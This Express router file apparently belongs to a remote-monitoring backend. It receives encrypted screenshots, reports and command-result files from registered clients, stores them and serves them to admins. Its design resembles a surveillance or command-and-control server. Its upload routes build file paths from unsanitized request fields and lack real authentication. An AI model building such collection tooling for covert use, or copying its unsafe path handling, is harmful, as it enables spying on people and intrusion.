import { Router } from "express";
import multer from "multer";
import path from "path";
import fs from "fs";
import { prisma } from "../prisma";
import { decryptAes256CbcPrefixedIv } from "../encryption";
import { requireAuth } from "../middleware/auth";

const router = Router();
const storage = multer.memoryStorage();
const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });

const UPLOAD_DIR =
  process.env.UPLOAD_DIR || path.join(process.cwd(), "storage");

router.post("/screenshots", upload.single("screenshot"), async (req, res) => {
  try {
    const clientId =
      (req.body.clientId as string) ||
      (req.headers["x-client-id"] as string) ||
      "";
    const timestampStr =
      (req.body.timestamp as string) || new Date().toISOString();
    if (!clientId || !req.file)
      return res
        .status(400)
        .json({ message: "clientId and screenshot required" });

    const client = await prisma.client.findUnique({ where: { id: clientId } });
    if (!client || !client.encryptionKey) {
      return res
        .status(400)
        .json({ message: "Client not registered or missing key" });
    }

    const decrypted = decryptAes256CbcPrefixedIv(
      req.file.buffer,
      client.encryptionKey
    );
    const clientDir = path.join(UPLOAD_DIR, "screenshots", clientId);
    fs.mkdirSync(clientDir, { recursive: true });
    const tsParsed = new Date(timestampStr);
    const sendTs = isNaN(tsParsed.getTime()) ? new Date() : tsParsed;
    const iso = sendTs.toISOString().replace(/[:]/g, "-");
    const filename = `${clientId}_${iso}.jpg`;
    const filepath = path.join(clientDir, filename);
    fs.writeFileSync(filepath, decrypted);

    const rec = await prisma.screenshot.create({
      data: {
        clientId,
        timestamp: sendTs,
        filename,
        path: filepath,
      },
    });

    res.json({
      ok: true,
      id: rec.id,
      filename,
      path: filepath,
      timestamp: sendTs.toISOString(),
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to ingest screenshot" });
  }
});

router.post("/reports", upload.single("report"), async (req, res) => {
  try {
    const clientId =
      (req.body.clientId as string) ||
      (req.headers["x-client-id"] as string) ||
      "";
    const timestampStr = new Date().toISOString();
    if (!clientId || !req.file)
      return res.status(400).json({ message: "clientId and report required" });

    const client = await prisma.client.findUnique({ where: { id: clientId } });
    if (!client || !client.encryptionKey) {
      return res
        .status(400)
        .json({ message: "Client not registered or missing key" });
    }

    const decrypted = decryptAes256CbcPrefixedIv(
      req.file.buffer,
      client.encryptionKey
    );
    const clientDir = path.join(UPLOAD_DIR, "reports", clientId);
    fs.mkdirSync(clientDir, { recursive: true });
    const now2 = new Date();
    const filename = `${now2.toISOString().replace(/[:]/g, "-")}_${Date.now()}`;
    const filepath = path.join(clientDir, filename);
    fs.writeFileSync(filepath, decrypted);

    const rec = await prisma.report.create({
      data: {
        clientId,
        timestamp: new Date(timestampStr),
        filename,
        path: filepath,
      },
    });

    res.json({ id: rec.id });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to ingest report" });
  }
});

// Listings for admin
router.get("/screenshots", requireAuth, async (req, res) => {
  const { page = "1", pageSize = "20", clientId } = req.query as any;
  const where = clientId ? { clientId: String(clientId) } : {};
  const all = await prisma.screenshot.findMany({
    where,
    orderBy: { timestamp: "desc" },
  });
  const filtered = all.filter((it) => it.path && fs.existsSync(it.path));
  const total = filtered.length;
  const start = (parseInt(page) - 1) * parseInt(pageSize);
  const end = start + parseInt(pageSize);
  const data = filtered.slice(start, end);
  res.json({ data, total });
});

router.get("/reports", requireAuth, async (req, res) => {
  const { page = "1", pageSize = "20", clientId } = req.query as any;
  const skip = (parseInt(page) - 1) * parseInt(pageSize);
  const where = clientId ? { clientId: String(clientId) } : {};
  const [items, total] = await Promise.all([
    prisma.report.findMany({
      where,
      orderBy: { timestamp: "desc" },
      skip,
      take: parseInt(pageSize),
    }),
    prisma.report.count({ where }),
  ]);
  res.json({ data: items, total });
});

// Secure file serving
router.get("/screenshots/:id/file", requireAuth, async (req, res) => {
  const id = parseInt(req.params.id, 10);
  const rec = await prisma.screenshot.findUnique({ where: { id } });
  if (!rec) return res.status(404).json({ message: "Not found" });
  if (!rec.path || !fs.existsSync(rec.path))
    return res.status(404).json({ message: "Not found" });
  res.sendFile(rec.path);
});

router.get("/reports/:id/file", requireAuth, async (req, res) => {
  const id = parseInt(req.params.id, 10);
  const rec = await prisma.report.findUnique({ where: { id } });
  if (!rec) return res.status(404).json({ message: "Not found" });
  if (!rec.path || !fs.existsSync(rec.path))
    return res.status(404).json({ message: "Not found" });
  res.sendFile(rec.path);
});

// Command result file upload (encrypted)
router.post("/commands/:id/result", upload.single("file"), async (req, res) => {
  try {
    const id = req.params.id;
    const clientId =
      (req.body.clientId as string) ||
      (req.headers["x-client-id"] as string) ||
      "";
    const timestampStr =
      (req.body.timestamp as string) || new Date().toISOString();
    if (!clientId || !req.file)
      return res.status(400).json({ message: "clientId and file required" });

    const client = await prisma.client.findUnique({ where: { id: clientId } });
    if (!client || !client.encryptionKey) {
      return res
        .status(400)
        .json({ message: "Client not registered or missing key" });
    }

    const decrypted = decryptAes256CbcPrefixedIv(
      req.file.buffer,
      client.encryptionKey
    );
    const clientDir = path.join(UPLOAD_DIR, "commands", clientId);
    fs.mkdirSync(clientDir, { recursive: true });
    const filename = `${id}_${timestampStr.replace(/[:]/g, "-")}_${Date.now()}`;
    const filepath = path.join(clientDir, filename);
    fs.writeFileSync(filepath, decrypted);

    res.json({ ok: true, path: filepath });
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to ingest command file result" });
  }
});

// Admin: download latest file result for a command id
router.get("/commands/:id/file/latest", requireAuth, async (req, res) => {
  try {
    const id = req.params.id;
    const baseDir = path.join(UPLOAD_DIR, "commands");
    const clientDirs = fs.existsSync(baseDir) ? fs.readdirSync(baseDir) : [];
    let latestPath = "";
    let latestMtime = 0;
    for (const c of clientDirs) {
      const dir = path.join(baseDir, c);
      const files = fs.readdirSync(dir).filter((f) => f.startsWith(`${id}_`));
      for (const f of files) {
        const fp = path.join(dir, f);
        const stat = fs.statSync(fp);
        if (stat.mtimeMs > latestMtime) {
          latestMtime = stat.mtimeMs;
          latestPath = fp;
        }
      }
    }
    if (!latestPath) return res.status(404).json({ message: "Not found" });
    res.sendFile(latestPath);
  } catch (e) {
    console.error(e);
    res.status(500).json({ message: "Failed to fetch command file" });
  }
});

export default router;
